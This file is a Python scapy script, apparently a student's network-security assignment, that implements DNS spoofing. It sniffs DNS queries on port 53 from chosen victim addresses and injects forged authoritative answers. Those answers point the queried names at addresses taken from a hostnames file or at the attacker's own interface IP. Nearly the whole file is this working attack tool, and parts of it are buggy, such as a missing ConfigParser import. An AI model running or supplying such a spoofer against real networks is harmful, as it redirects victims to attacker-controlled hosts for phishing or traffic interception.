

#ATMIKA SHARMA
#SBU ID: 111464371

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
import os.path
from scapy.all import *
import sys, getopt
import socket
import fcntl
import struct

global intrfc 
global file 
global bpf

intrfc = ''

file = ''

bpf = ''


def dnsfunc(pkt):
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	address = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915, struct.pack('256s', intrfc[:15]))[20:24])
	
	variable = ''
	
	if IP in pkt:
	
		destination = pkt[IP].dst

		source = pkt[IP].src

		if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:

			print str(source) + " -> " + str(destination) + " : " + "(" + pkt.getlayer(DNS).qd.qname + ")"

		if bpf:

			mylist = bpf.split(',')

			if source not in mylist:

				return 0

			if os.path.isfile(file):

				config = ConfigParser.RawConfigParser()

				config.read(file)

				if variable != address:			

					dmn = pkt.getlayer(DNS).qd.qname[:-1]

					print dmn

					variable = config.get('database', dmn)

					#print variable

				
			else:

				variable = address

		got_pkt = sr1(IP(dst=pkt[IP].src, src = pkt[IP].dst)/\
			UDP(dport = pkt[UDP].sport, sport = pkt[UDP].dport)/\
			DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa = 1, qr = 1, \
			an = DNSRR(rrname = pkt[DNS].qd.qname, ttl = 10, rdata = variable)))
		send(got_pkt)
		

if __name__ == "__main__":
	

	try:
		# http://www.pythonforbeginners.com/system/python-sys-argv

		options, arguments = getopt.getopt(sys.argv[1:], "hi:f:",["interface=", "file="])

	except getopt.GetoptError:
		
		print 'invalid options getopt error'
		
		sys.exit()

	for option, argument in options:
		
		#getting interface
		if option in ("-i", "--interface"):
		
			intrfc=argument
		
		#file name for hostnames and ip
		elif option in ("-f", "--file"):
		
			file=argument

	
	#get bpf
	if(len(sys.argv)==4):
		
		bpf = sys.argv[3]

	#get bpf
	elif(len(sys.argv)==6):
		
		bpf = sys.argv[5]

	if intrfc:
		
		flag = 1
	
	else:
		
		flag = 0

	if flag==0:
	
		sniff(filter="udp and port 53", prn=dnsfunc, store=0)
	
	else:
	
		sniff(iface=intrfc, filter="udp and port 53", prn=dnsfunc, store=0)

	#https://thepacketgeek.com/scapy-sniffing-with-custom-actions-part-1/

	print "\nFINISH"